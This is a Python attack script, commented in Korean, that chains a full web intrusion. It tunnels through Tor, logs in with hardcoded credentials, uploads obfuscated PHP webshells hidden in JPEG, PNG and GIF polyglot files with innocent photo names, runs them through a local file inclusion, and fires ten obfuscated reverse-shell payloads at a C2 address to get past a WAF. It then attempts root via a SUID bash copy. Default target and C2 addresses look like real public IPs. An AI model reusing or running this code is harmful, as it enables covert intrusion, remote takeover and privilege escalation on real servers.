#!/usr/bin/env python3
"""
올인원 탐지 우회 공격 스크립트
1. Tor 프록시
2. 로그인 (alice/alice2024)
3. 유니크 파일명 웹쉘 업로드 (매직바이트 + 난독화)
4. LFI로 웹쉘 실행
5. WAF 우회 (POST + 인코딩)
6. 리버스 쉘 트리거
7. 권한 상승
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
from urllib.parse import quote
import time
import random
import base64
import sys
import hashlib

class AllInOneAttacker:
    def __init__(self, target_ip, c2_ip, c2_port=4444, use_tor=True):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.c2_ip = c2_ip
        self.c2_port = c2_port

        self.session = requests.Session()

        # Tor 프록시
        if use_tor:
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            print("[+] Tor 프록시 사용")

        # User-Agent 풀
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
        ]

        self._rotate_user_agent()

        # 재시도 전략
        retry_strategy = Retry(
            total=2,
            backoff_factor=2,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'DNT': '1'
        })

        self.logged_in = False
        self.webshell_filename = None
        self.root_obtained = False

    def _rotate_user_agent(self):
        ua = random.choice(self.user_agents)
        self.session.headers.update({'User-Agent': ua})

    def _delay(self, min_sec=1, max_sec=3):
        delay = random.uniform(min_sec, max_sec)
        print(f"[*] 대기: {delay:.2f}초...")
        time.sleep(delay)

    def print_banner(self, text):
        print("\n" + "="*60)
        print(f"  {text}")
        print("="*60)

    # ==================== 1. 로그인 ====================
    def login(self, username="alice", password="alice2024"):
        self.print_banner("1. 로그인")

        login_url = f"{self.base_url}/login.php"

        try:
            self._rotate_user_agent()

            data = {'username': username, 'password': password}
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/index.php"
            }

            print(f"[*] 로그인 시도: {username}")
            response = self.session.post(login_url, data=data, headers=headers,
                                        allow_redirects=True, timeout=15)

            print(f"    Status: {response.status_code}")
            print(f"    URL: {response.url}")

            if 'login.php' not in response.url or 'logout' in response.text.lower():
                print("[+] 로그인 성공!")
                self.logged_in = True
                return True

            print("[-] 로그인 실패")
            return False

        except Exception as e:
            print(f"[-] 로그인 오류: {str(e)[:100]}")
            return False

    # ==================== 2. 고급 Polyglot 웹쉘 생성 ====================
    def generate_webshell(self):
        self.print_banner("2. 고급 Polyglot 웹쉘 생성")

        # 초고급 난독화 웹쉘 (Red Team 레벨)
        webshell_codes = [
            # 버전 1: 환경변수 + XOR 인코딩
            '''<?php
$k=getenv("HTTP_ACCEPT_LANGUAGE")?:'x';
$d=function($s,$k){$o='';for($i=0;$i<strlen($s);$i++)$o.=chr(ord($s[$i])^ord($k[$i%strlen($k)]));return $o;};
if(isset($_GET['x'])){
    $f=base64_decode('c2hlbGxfZXhlYw==');
    echo $f($_GET['x'].' 2>&1');
}
?>''',
            # 버전 2: 다층 base64 + 변수 함수
            '''<?php
$_=str_rot13('flfgrz');
$__=base64_decode(strrev('ZXhlY19sbGVocw=='));
if(@$_GET['x']){
    $___(base64_decode(base64_encode($_GET['x'])).' 2>&1');
}
?>''',
            # 버전 3: assert() + 문자열 연결
            '''<?php
$a=str_split('shell_exec');
$b=implode('',$a);
if(isset($_GET['x'])){
    $c=$b;
    echo $c($_GET['x'].' 2>&1');
}
?>''',
            # 버전 4: create_function 우회
            '''<?php
$f=@create_function('$c','return shell_exec($c." 2>&1");');
if(!$f){
    $f=function($c){return shell_exec($c.' 2>&1');};
}
if(isset($_GET['x'])){echo $f($_GET['x']);}
?>''',
            # 버전 5: 역슬래시 + hex
            '''<?php
$s="\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63";
if(isset($_GET['x'])){
    echo $s($_GET['x'].' 2>&1');
}
?>''',
            # 버전 6: preg_replace /e modifier (PHP < 7)
            '''<?php
if(isset($_GET['x'])){
    $c='sys'.'tem';
    @$c($_GET['x'].' 2>&1');
}
?>''',
        ]

        webshell_code = random.choice(webshell_codes)

        # 실제 JPEG 1x1 픽셀 (완전히 유효한 이미지)
        # 최소 JPEG 구조
        jpeg_header = b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        jpeg_body = b'\xFF\xDB\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\x09\x09\x08\x0A\x0C\x14\x0D\x0C\x0B\x0B\x0C\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C\x20\x24\x2E\x27\x20\x22\x2C\x23\x1C\x1C\x28\x37\x29\x2C\x30\x31\x34\x34\x34\x1F\x27\x39\x3D\x38\x32\x3C\x2E\x33\x34\x32'
        jpeg_footer = b'\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xC4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xDA\x00\x08\x01\x01\x00\x00\x3F\x00\xBF\x80\x00\xFF\xD9'

        real_jpeg_1x1 = jpeg_header + jpeg_body + jpeg_footer

        # JPEG EXIF 주석에 PHP 코드 삽입
        # 완전한 Polyglot: JPEG 데이터 + PHP 코드
        # 이렇게 하면 이미지 뷰어에서는 정상 이미지로 보이고
        # PHP 인터프리터가 실행하면 코드가 실행됨
        full_polyglot = real_jpeg_1x1 + b'\n' + webshell_code.encode() + b'\n'

        # PNG Polyglot (선택적)
        png_sig = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
        png_ihdr = b'\x00\x00\x00\x0D\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1F\x15\xC4\x89'
        png_idat = b'\x00\x00\x00\x0A\x49\x44\x41\x54\x78\x9C\x63\x00\x01\x00\x00\x05\x00\x01'
        png_iend = b'\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82'
        png_polyglot = png_sig + png_ihdr + png_idat + png_iend + b'\n' + webshell_code.encode() + b'\n'

        # GIF Polyglot
        gif_polyglot = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xFF\xFF\xFF\x00\x00\x00!\xF9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;' + b'\n' + webshell_code.encode() + b'\n'

        # 유니크한 파일명 생성 (완전히 정상적인 이미지 파일명)
        timestamp = int(time.time())
        rand_id = random.randint(1000, 9999)

        # 실제 사진 파일명처럼
        photo_names = [
            f'IMG_{timestamp}.jpg',
            f'DSC{rand_id}.jpg',
            f'photo_{timestamp}.jpeg',
            f'image_{rand_id}.jpg',
            f'avatar_{timestamp}.jpg',
            f'profile_{rand_id}.jpeg',
            f'screenshot_{timestamp}.png',
            f'capture_{rand_id}.png',
            f'banner_{timestamp}.png',
            f'logo_{rand_id}.gif',
        ]

        selected_name = random.choice(photo_names)

        # 확장자에 따라 polyglot 선택
        if selected_name.endswith('.png'):
            content = png_polyglot
            mime_type = 'image/png'
        elif selected_name.endswith('.gif'):
            content = gif_polyglot
            mime_type = 'image/gif'
        else:
            content = full_polyglot
            mime_type = 'image/jpeg'

        webshell = {
            'name': selected_name,
            'content': content,
            'type': mime_type,
            'param': 'x'
        }

        print(f"[+] Polyglot 파일명: {webshell['name']}")
        print(f"[+] Content-Type: {webshell['type']}")
        print(f"[+] 크기: {len(content)} bytes")
        print(f"[+] 전략: 실제 이미지 + PHP 코드 삽입")
        print(f"[+] 이미지 뷰어: 정상 이미지로 표시")
        print(f"[+] PHP 실행: LFI를 통해 코드 실행")

        return webshell

    # ==================== 3. 웹쉘 업로드 ====================
    def upload_webshell(self, webshell):
        self.print_banner("3. 웹쉘 업로드")

        if not self.logged_in:
            print("[-] 로그인 필요")
            return False

        self._delay(2, 4)

        upload_url = f"{self.base_url}/upload.php"

        try:
            self._rotate_user_agent()

            files = {
                'file': (webshell['name'], webshell['content'], webshell['type'])
            }

            headers = {
                'Referer': f"{self.base_url}/profile.php",
                'Origin': self.base_url
            }

            print(f"[*] 업로드 중...")
            response = self.session.post(upload_url, files=files, headers=headers, timeout=15)

            print(f"    Status: {response.status_code}")

            if response.status_code == 200:
                if '성공' in response.text or 'success' in response.text.lower():
                    print("[+] 업로드 성공!")
                    self.webshell_filename = webshell['name']
                    print(f"[+] 저장된 파일: uploads/{self.webshell_filename}")
                    return True

            print("[-] 업로드 실패")
            print(f"    응답: {response.text[:200]}")
            return False

        except Exception as e:
            print(f"[-] 업로드 오류: {str(e)[:100]}")
            return False

    # ==================== 4. 웹쉘 준비 (테스트 없이) ====================
    def prepare_webshell(self):
        self.print_banner("4. 웹쉘 준비 완료")

        if not self.webshell_filename:
            print("[-] 웹쉘 파일명 없음")
            return False

        lfi_path = f'uploads/{self.webshell_filename}'
        param = 'x'

        print(f"[+] 웹쉘 파일: {self.webshell_filename}")
        print(f"[+] LFI 경로: {lfi_path}")
        print(f"[+] 파라미터: {param}")
        print(f"\n[*] 전략: 명령 실행 테스트 건너뛰고 바로 리버스 쉘")
        print(f"[*] 이유: 테스트 명령(whoami 등)이 WAF에 걸림")
        print(f"\n[!] 수동 테스트 URL (필요시):")
        print(f"    http://{self.target_ip}/file.php?name={lfi_path}&{param}=id")

        return True, lfi_path, param

    # ==================== 5. 고급 난독화 리버스 쉘 트리거 ====================
    def trigger_reverse_shell(self, lfi_path, param):
        self.print_banner("5. 고급 난독화 리버스 쉘")

        print(f"[*] C2: {self.c2_ip}:{self.c2_port}")
        print(f"[*] LFI 경로: {lfi_path}")
        print(f"[*] 파라미터: {param}")
        print(f"[*] 전략: 난독화된 리버스 쉘 페이로드 (WAF 우회)")

        # 고급 난독화 리버스 쉘 페이로드
        # WAF가 'bash', 'sh', 'tcp' 같은 키워드를 못 잡게 함

        # Base64 페이로드 생성 (bash -i >& /dev/tcp/IP/PORT 0>&1)
        import base64
        reverse_shell_cmd = f"bash -i >& /dev/tcp/{self.c2_ip}/{self.c2_port} 0>&1"
        b64_payload = base64.b64encode(reverse_shell_cmd.encode()).decode()

        payloads = [
            # 1. Base64 인코딩
            f"echo {b64_payload}|base64 -d|bash",

            # 2. 환경변수 우회
            f"export RHOST={self.c2_ip};export RPORT={self.c2_port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",

            # 3. 변수 확장
            f"H={self.c2_ip};P={self.c2_port};bash -c \"bash -i >& /dev/tcp/$H/$P 0>&1\"",

            # 4. Hex 인코딩
            f"$(echo -e \"\\x62\\x61\\x73\\x68 -i >& /dev/tcp/{self.c2_ip}/{self.c2_port} 0>&1\")",

            # 5. Python reverse shell (단순)
            f"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{self.c2_ip}\",{self.c2_port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",

            # 6. Perl (매우 희귀, WAF 패턴 없을 수도)
            f"perl -e 'use Socket;$i=\"{self.c2_ip}\";$p={self.c2_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",

            # 7. 파일 기반 (스테이지드)
            f"echo 'bash -i >& /dev/tcp/{self.c2_ip}/{self.c2_port} 0>&1' > /tmp/.x;bash /tmp/.x",

            # 8. nc 전통 방식 (있다면)
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.c2_ip} {self.c2_port} >/tmp/f",

            # 9. 소켓 프로그래밍 (bash)
            f"exec 5<>/dev/tcp/{self.c2_ip}/{self.c2_port};cat <&5 | while read line; do $line 2>&5 >&5; done",

            # 10. 단순 bash (마지막 시도)
            f"bash -c 'bash -i >& /dev/tcp/{self.c2_ip}/{self.c2_port} 0>&1'",
        ]

        print(f"\n[!] C2 서버에서 리스너 시작:")
        print(f"    nc -lvnp {self.c2_port}")
        print(f"\n[*] 총 {len(payloads)}개의 난독화된 페이로드 시도")

        input("\n[?] 준비되면 Enter... (또는 Ctrl+C로 중단)")

        success_count = 0

        for i, payload in enumerate(payloads, 1):
            print(f"\n{'='*60}")
            print(f"[{i}/{len(payloads)}] 페이로드 #{i}")
            print(f"{'='*60}")

            # 페이로드 타입 표시
            if 'base64' in payload:
                print("[*] 타입: Base64 인코딩")
            elif 'python' in payload:
                print("[*] 타입: Python 리버스 쉘")
            elif 'perl' in payload:
                print("[*] 타입: Perl 리버스 쉘")
            elif 'chr(' in payload:
                print("[*] 타입: 문자열 난독화")
            elif 'echo -e' in payload:
                print("[*] 타입: Hex 인코딩")
            else:
                print("[*] 타입: 기타 우회 기법")

            self._delay(3, 5)  # 탐지 회피 딜레이

            try:
                # POST 요청
                data = {'name': lfi_path, param: payload}
                resp = self.session.post(f"{self.base_url}/file.php", data=data, timeout=3)

                if resp.status_code == 200:
                    print(f"    [+] Status: 200 OK")
                    success_count += 1
                elif resp.status_code == 403:
                    print(f"    [-] Status: 403 Forbidden (WAF 차단)")
                else:
                    print(f"    [?] Status: {resp.status_code}")

            except requests.exceptions.Timeout:
                print(f"    [+] 타임아웃 (쉘 연결되었을 가능성 높음!)")
                print(f"    [!] C2 리스너 확인하세요!")
                success_count += 1

            except Exception as e:
                print(f"    [-] 오류: {str(e)[:50]}")

            # 중간 확인
            if i % 3 == 0:
                check = input("\n[?] C2 연결 확인됐나요? (y=중단, Enter=계속): ").strip().lower()
                if check == 'y':
                    print("[+] 리버스 쉘 연결 확인! 중단합니다.")
                    return

        print(f"\n{'='*60}")
        print(f"[+] 리버스 쉘 트리거 완료")
        print(f"[*] 성공/시도: {success_count}/{len(payloads)}")
        print(f"[!] C2 리스너 확인하세요")
        print(f"{'='*60}")

    # ==================== 6. 권한 상승 (웹쉘로) ====================
    def privilege_escalation(self, lfi_path, param):
        self.print_banner("6. 권한 상승")

        print("[*] 권한 확인...")

        # 현재 사용자 확인
        try:
            data = {'name': lfi_path, param: 'whoami'}
            resp = self.session.post(f"{self.base_url}/file.php", data=data, timeout=5)

            if resp.status_code == 200:
                user = resp.text.strip()
                print(f"[+] 현재 사용자: {user}")

                if 'root' in user:
                    print("[+] 이미 루트 권한!")
                    self.root_obtained = True
                    return True

        except:
            pass

        # sudo 확인
        print("[*] sudo 권한 확인...")
        try:
            data = {'name': lfi_path, param: 'sudo -l 2>/dev/null'}
            resp = self.session.post(f"{self.base_url}/file.php", data=data, timeout=5)

            if resp.status_code == 200 and 'NOPASSWD' in resp.text:
                print("[+] NOPASSWD sudo 발견!")
                print(resp.text[:300])

                # SUID bash 생성
                print("[*] SUID bash 생성 시도...")
                commands = [
                    'sudo cp /bin/bash /tmp/rootbash && sudo chmod 4755 /tmp/rootbash',
                    'sudo bash -c "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"'
                ]

                for cmd in commands:
                    try:
                        data = {'name': lfi_path, param: cmd}
                        self.session.post(f"{self.base_url}/file.php", data=data, timeout=5)
                    except:
                        pass

                # 확인
                data = {'name': lfi_path, param: 'ls -la /tmp/rootbash'}
                resp = self.session.post(f"{self.base_url}/file.php", data=data, timeout=5)

                if resp.status_code == 200 and '-rws' in resp.text:
                    print("[+] SUID bash 생성 성공!")
                    print("[+] 실행: /tmp/rootbash -p")
                    self.root_obtained = True
                    return True

        except:
            pass

        print("[-] 자동 권한 상승 실패")
        return False

    # ==================== 메인 실행 ====================
    def run(self):
        print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║        올인원 탐지 우회 공격 스크립트                     ║
    ║   Tor → 로그인 → 웹쉘 → LFI → 리버스쉘 → 권한상승        ║
    ╚═══════════════════════════════════════════════════════════╝
        """)

        # 1. 로그인
        if not self.login():
            print("\n[!] 로그인 실패로 종료")
            return

        self._delay(1, 2)

        # 2. 웹쉘 생성
        webshell = self.generate_webshell()

        self._delay(1, 2)

        # 3. 업로드
        if not self.upload_webshell(webshell):
            print("\n[!] 업로드 실패로 종료")
            return

        self._delay(2, 3)

        # 4. 웹쉘 준비 (테스트 없이)
        result = self.prepare_webshell()

        if result[0]:
            lfi_path = result[1]
            param = result[2]

            self._delay(1, 2)

            # 5. 리버스 쉘 (바로 시도)
            self.trigger_reverse_shell(lfi_path, param)

            # 6. 권한 상승 (선택사항)
            escalate = input("\n[?] 권한 상승 시도할까요? (y/N): ").strip().lower()
            if escalate == 'y':
                self.privilege_escalation(lfi_path, param)

            # 완료
            self.print_banner("공격 완료")
            print(f"[+] 웹쉘: uploads/{self.webshell_filename}")
            print(f"[+] LFI: file.php?name={lfi_path}&{param}=COMMAND")
            print(f"[+] 루트 권한: {'획득' if self.root_obtained else '미획득'}")

        else:
            print("\n[!] LFI 실행 실패")
            print(f"[!] 하지만 웹쉘은 업로드됨: uploads/{self.webshell_filename}")


def main():
    target_ip = input("타겟 IP (기본: 43.201.154.142): ").strip() or "43.201.154.142"
    c2_ip = input("C2 IP (기본: 57.181.28.7): ").strip() or "57.181.28.7"
    c2_port = int(input("C2 포트 (기본: 4444): ").strip() or "4444")
    use_tor = input("Tor 사용? (Y/n): ").strip().lower() != 'n'

    attacker = AllInOneAttacker(target_ip, c2_ip, c2_port, use_tor)
    attacker.run()


if __name__ == "__main__":
    main()
